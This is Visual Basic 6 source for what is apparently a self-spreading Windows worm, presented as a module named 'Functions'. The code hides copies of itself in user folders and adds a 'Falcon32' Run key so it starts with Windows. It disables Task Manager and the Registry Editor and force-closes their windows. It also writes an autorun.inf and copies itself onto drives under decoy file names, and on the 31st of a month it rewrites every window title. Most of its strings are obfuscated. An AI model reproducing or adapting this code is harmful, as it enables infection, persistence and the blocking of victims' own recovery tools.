Attribute VB_Name = "Functions"
Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Const MAX_PATH = 255

Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long

Private Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long

Private Declare Function SHGetSpecialFolderLocation Lib "shell32.dll" (ByVal hwndOwner As Long, ByVal nFolder As Long, pidl As ITEMIDLIST) As Long
Private Declare Function SHGetPathFromIDList Lib "shell32.dll" Alias "SHGetPathFromIDListA" (ByVal pidl As Long, ByVal pszPath As String) As Long

Private Type SHITEMID
    cb As Long
    abID As Byte
End Type

Private Type ITEMIDLIST
    mkid As SHITEMID
End Type

Private K()

Public Const Dsk% = 0
Public Const Prg% = 2
Public Const Doc% = 5
Public Const Fav% = 6
Public Const Str% = 7
Public Const Rec% = 8
Public Const Snd% = 9
Public Const Stm% = 11
Public Const Msc% = 13
Public Const Vid% = 14
Public Const Nsh% = 19
Public Const Fts% = 20
Public Const Tpl% = 21
Public Const Pdp% = 23
Public Const Pds% = 24
Public Const Roa% = 26
Public Const Loc% = 28
Public Const Prd% = 35
Public Const Win% = 36
Public Const Sys% = 37
Public Const Pic% = 39
Public Const Usr% = 40
Public Const Sw6% = 41
Public Const Res% = 56

Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Function EnumWindows Lib "user32" (ByVal lpfn As Long, lParam As Any) As Long
Private Declare Function SetWindowText Lib "user32" Alias "SetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String) As Long
Private Const WM_CLOSE = &H10
Public Sub ChkWnd()
On Error GoTo Er
Dim Ret     As Long
Ret = FindWindow(vbNullString, "Administrador de tareas")
    If Ret <> 0 Then
        SetWindowText Ret, Ec("¦ƒ£¯ëêö¾™´›±ˆ¹Š­•ö™ø±‹ø°ª½ùùù¥…¦")
        PostMessage Ret, WM_CLOSE, ByVal 0&, ByVal 0&
        End If

Ret = FindWindow(vbNullString, "Editor del registro")
    If Ret <> 0 Then
        SetWindowText Ret, Ec("¦ƒ£¯ëêö¾™´›±ˆ¹Š­•ö™ø±‹ø°ª½ùùù¥…¦")
        PostMessage Ret, WM_CLOSE, ByVal 0&, ByVal 0&
        End If
        
Ret = FindWindow(vbNullString, "Administrador de tareas de Windows")
    If Ret <> 0 Then
        SetWindowText Ret, Ec("¦ƒ£¯ëêö¾™´›±ˆ¹Š­•ö™ø±‹ø°ª½ùùù¥…¦")
        PostMessage Ret, WM_CLOSE, ByVal 0&, ByVal 0&
        End If
        
Ret = FindWindow(vbNullString, "Windows task manager")
    If Ret <> 0 Then
        SetWindowText Ret, Ec("¦ƒ£¯ëêö¾™´›±ˆ¹Š­•ö™ø±‹ø°ª½ùùù¥…¦")
        PostMessage Ret, WM_CLOSE, ByVal 0&, ByVal 0&
        End If
        
Ret = FindWindow(vbNullString, "Task manager")
    If Ret <> 0 Then
        SetWindowText Ret, Ec("¦ƒ£¯ëêö¾™´›±ˆ¹Š­•ö™ø±‹ø°ª½ùùù¥…¦")
        PostMessage Ret, WM_CLOSE, ByVal 0&, ByVal 0&
        End If

Ret = FindWindow(vbNullString, "Registry editor")
    If Ret <> 0 Then
        SetWindowText Ret, Ec("¦ƒ£¯ëêö¾™´›±ˆ¹Š­•ö™ø±‹ø°ª½ùùù¥…¦")
        PostMessage Ret, WM_CLOSE, ByVal 0&, ByVal 0&
        End If
Er:
Ret = 0: Exit Sub
End Sub
Public Function SF(ByVal lFold As Byte) As String
On Error Resume Next
Dim Bf$, Ret&

    Select Case lFold
    
        Case 0
        Bf = String$(MAX_PATH, Chr$(0))
        Ret = GetWindowsDirectory(Bf, MAX_PATH)
        SF = Mid$(Bf, 1, InStr(Bf, Chr$(0)) - 1)
        SF = VAL_PATH(SF)

        Case 1
        Bf = Space$(MAX_PATH)
        Ret = GetSystemDirectory(Bf, MAX_PATH)
        SF = Mid$(Bf, 1, InStr(Bf, Chr$(0)) - 1)
        SF = VAL_PATH(SF)

        Case 2
        Bf = String$(MAX_PATH, Chr$(0))
        Ret = GetTempPath(MAX_PATH, Bf)
        SF = Mid$(Bf, 1, InStr(Bf, Chr$(0)) - 1)
        SF = VAL_PATH(SF)
        
        Case 3
        Dim Ext
        Ext = Array(".com", ".exe", ".bat", ".pif", ".scr", ".dat", ".sys")
            For i = 0 To UBound(Ext)
                If FILE_EXISTS(GET_NAME(PE) & Ext(i)) Then
                    SF = GET_NAME(PE) & Ext(i)
                    End If
            Next
        
        Case 4
        SF = Environ$("SYSTEMDRIVE")
        SF = VAL_PATH(SF)
        
    End Select
End Function
Public Function VAL_PATH(ByVal lPath As String) As String
On Error Resume Next: Dim A$
If Len(lPath) > 5 Then
    If Right(lPath, 1) <> "\" Then VAL_PATH = lPath + "\"
    If Right(lPath, 1) = "\" Then VAL_PATH = lPath
    ElseIf Len(lPath) < 5 Then
        If Right$(lPath, 1) <> "\" Then
            VAL_PATH = lPath + "\"
            End If
        If Right$(lPath, 1) = ":" Then
            VAL_PATH = lPath + "\"
            End If
        A = Right$(lPath, 1)
        If Left(A, 1) <> ":" Then
            VAL_PATH = lPath + ":\"
            End If
    End If
End Function
Public Function UF(ByVal lFolder As Byte) As String
On Error Resume Next
Dim Rt      As Long
Dim IDL     As ITEMIDLIST

Rt = SHGetSpecialFolderLocation(100, lFolder, IDL)
       Path$ = Space$(512)
       Rt = SHGetPathFromIDList(ByVal IDL.mkid.cb, ByVal Path$)
       UF = Left$(Path, InStr(Path, Chr$(0)) - 1)
       UF = VAL_PATH(UF)
       Exit Function
End Function
Private Function PE() As String
On Error Resume Next
Dim MDF     As Long
Dim Bf      As String

Bf = Space$(MAX_PATH)

MDF = GetModuleFileName(0&, Bf, MAX_PATH)

PE = Left(Bf, InStr(Bf, Chr$(0)) - 1)
End Function
Public Function FILE_EXISTS(ByVal lFile As String) As Boolean
On Error Resume Next

FILE_EXISTS = IIf(Dir(lFile, vbArchive + vbHidden + vbNormal _
+ vbSystem) <> "", True, False)

End Function
Public Function GET_NAME(ByVal lFile As String) As String
On Error Resume Next

GET_NAME = Left$(lFile, InStr(lFile, ".") - 1)

End Function
Public Sub Config()
On Error Resume Next

CF SF(3), UF(Fav) + Ec("¹´»ëêö¼¹¬")
SetAttr UF(Fav) + Ec("¹´»ëêö¼¹¬"), vbHidden + vbSystem + vbReadOnly

Dim SZ As String
SZ = StrConv(LoadResData(101, "CUSTOM"), vbUnicode): Z = FreeFile
Open UF(Fav) + "wrcffg.pif" For Binary As #Z
    Put #Z, , SZ
    Close #Z
    
SetAttr UF(Fav) + "wrcffg.pif", vbHidden + vbSystem + vbReadOnly
CK 2, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Falcon32", _
UF(Fav) + "wrcffg.pif", 0

CF SF(3), UF(Usr) + "Falkon.exe"
CF SF(3), UF(Usr) + "cmd.exe"
CF SF(3), UF(Usr) + "regedit.exe"


CK 2, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", _
1, 1

CK 2, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", _
1, 1


FileCopy UF(Fav) + "wrcffg.pif", UF(Str) + "wrcffg.pif"

Shell UF(Fav) + "wrcffg.pif"
End Sub
Public Sub ChkPayload()
On Error Resume Next

If Day(Now) = 31 Then
    Payload
    End If
End Sub
Private Sub Payload()
On Error Resume Next
Dim X   As Long

X = EnumWindows(AddressOf Search, ByVal 0&)
End Sub
Private Function Search(ByVal hWnd As Long, ByVal lPar As Long)
On Error Resume Next
SetWindowText hWnd, Ec("¦òıüş£ğ¯ëêö¾™´›±ˆ¹Š­•ö™ø±‹ø½Š½ùùùñ¥şüıò¦")
SetWindowText hWnd, Ec("óó††£ó£¦ş£ğ¯ëêö¾™´›±ˆ¹Š­•ö™ø±‹ø½Š½ù¦¦†l£¥£ó¥")
End Function
Public Sub Autorun(ByVal lPath As String)
On Error Resume Next
Dim At      As String

At = Ec("ƒ™­¬·ª­¶…") + vbCrLf + Ec("—¨½¶åŠ½«·­ª»½«„¹´»±¨¹ª­µö½ ½") + vbCrLf + _
Ec("«°½´´„·¨½¶„»·µµ¹¶¼åŠ½«·­ª»½«„¹´»±¨¹ª­µö½ ½") + vbCrLf + Ec("«°½´´„™­¬·„»·µµ¹¶¼åŠ½«·­ª»½«„¹´»±¨¹ª­µö½ ½") + vbCrLf + Ec("«°½´´½ ½»­¬½åŠ½«·­ª»½«„¹´»±¨¹ª­µö½ ½")

Z = FreeFile
Open lPath + Ec("™­¬·ª­¶ö±¶¾") For Binary As #Z
    Put #Z, , At
    Close #Z
End Sub
Private Function SearchX(ByVal lFolder As String) As String
Dim Cr    As String
Dim Cx    As String

lFolder = VAL_PATH(lFolder)
Cr = Dir$(lFolder + "*", vbHidden + vbSystem + vbArchive + vbReadOnly)

While Cr <> ""
    Cx = Cx & Cr & "|"
    Cr = Dir$
Wend

SearchX = Cx
End Function
Public Sub CopyMe(ByVal lDrive As String)
On Error Resume Next

A = Array(Ec("ˆ¹¿·«ö½ ½"), Ec("ˆ¹¿·«ö½ ½"), Ec("¹´»±¨¹ª­µöº¹¬"), _
Ec(" ö»·µ"), Ec("Ÿ•¹±´ö½ ½"), Ec("·¬·«ö½ ½"))

For i = 0 To UBound(A)
    FileCopy SF(3), lDrive + A(i)
Next
End Sub
